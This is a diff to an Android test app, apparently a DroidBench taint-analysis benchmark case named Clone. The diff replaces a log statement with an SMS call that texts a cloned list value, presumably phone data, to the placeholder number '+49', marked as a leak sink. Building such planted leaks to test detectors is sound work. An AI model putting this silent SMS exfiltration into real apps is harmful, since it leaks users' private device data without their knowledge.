@@ -1,11 +1,11 @@
 package edu.mit.clone;
 
-import java.util.LinkedList;
-
 import android.app.Activity;
 import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
-import android.util.Log;
+
+import java.util.LinkedList;
 
 /**
  * @testcase_name Clone
@@ -29,6 +29,7 @@ public class MainActivity extends Activity {
 
         LinkedList<String> list2 = (LinkedList<String>)list.clone();
 
-        Log.i("DroidBench", list2.get(0));
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49", null, list2.get(0), null, null);  //sink, leak
     }
 }
